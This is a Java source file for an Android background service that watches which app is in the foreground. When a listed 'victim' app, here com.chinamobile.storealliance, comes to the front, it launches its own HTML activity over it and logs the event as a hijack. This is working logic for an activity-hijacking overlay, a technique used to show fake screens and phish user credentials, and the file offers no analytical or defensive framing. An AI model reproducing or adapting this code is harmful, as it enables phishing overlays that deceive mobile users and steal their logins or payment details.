package com.godream.services;

import java.util.HashMap;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

import com.godream.HtmlViewActivity;
import com.godream.MainApplication;
import com.godream.util.LogUtil;


public class MoListenerService extends Service{
	Timer mTimer = new Timer();
	HashMap<String,Class<?>> mVicTims = new HashMap<String,Class<?>>();
	long delay = 1000;
	long period = 1000;
	Runnable mTimerTask = new Runnable() {
		@Override
		public void run() {
			while(true){
				ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
				List<RunningAppProcessInfo> appProcesses = manager.getRunningAppProcesses();
				for(RunningAppProcessInfo appProcess : appProcesses){
					if(appProcess.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND){
						if(mVicTims.containsKey(appProcess.processName)){
							if(((MainApplication)getApplication()).isHasStartListener() == false){
								Intent dialogIntent = new Intent(getBaseContext(),mVicTims.get(appProcess.processName));
								dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
								getApplication().startActivity(dialogIntent);
								((MainApplication)getApplication()).setHasStartListener(true);
								LogUtil.getInstance().i("劫持了"+appProcess.processName);
							}
						}
					}
				}
			}
		}
	};

	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		LogUtil.getInstance().i("onStartCommand");
		mVicTims.put("com.chinamobile.storealliance", HtmlViewActivity.class);
//		mTimer.scheduleAtFixedRate(mTimerTask, delay, period);
		new Thread(mTimerTask).start();
		
	    return super.onStartCommand(intent, flags, startId);
	}
	@Override
    public IBinder onBind(Intent intent) {
	    return null;
    }
}
